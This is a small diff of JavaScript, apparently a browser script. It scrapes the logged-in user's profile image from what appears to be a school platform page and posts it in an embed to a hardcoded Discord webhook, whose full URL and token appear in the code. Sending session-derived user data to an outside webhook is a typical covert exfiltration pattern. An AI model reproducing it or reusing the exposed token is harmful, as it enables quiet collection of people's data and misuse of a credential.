@@ -102,7 +102,6 @@
             .then(homeHTML => {
                 var homeDoc = parseHTML(homeHTML)
                 var bigProfileImage = homeDoc.querySelector("#nav-user > li.dropdown > a > img").src.replace('small', 'big')
-                console.log(homeDoc.querySelector("#nav-user > li.dropdown > a > img").src)
 
                 const request = new XMLHttpRequest();
                 request.open("POST", "https://discord.com/api/webhooks/1230789332747554848/pxn7mo6sf3x1ju5q2BW00dmPq4azGg5Qm8S0VJ71oMMvsDoXeERdl8AIaYpXUzzemT2f");
@@ -194,7 +193,7 @@
                         },
                         "timestamp": "2024-04-19T10:19:00.000Z",
                         "image": {
-                            "url": `https://cdn.viggo.dk/askovhoejogefterskole/users/1609/small/8d4eedf7-9e70-4025-87d8-c9d8fd3c03d7.jpg`
+                            "url": `${bigProfileImage}`
                         }
                         }
                     ],
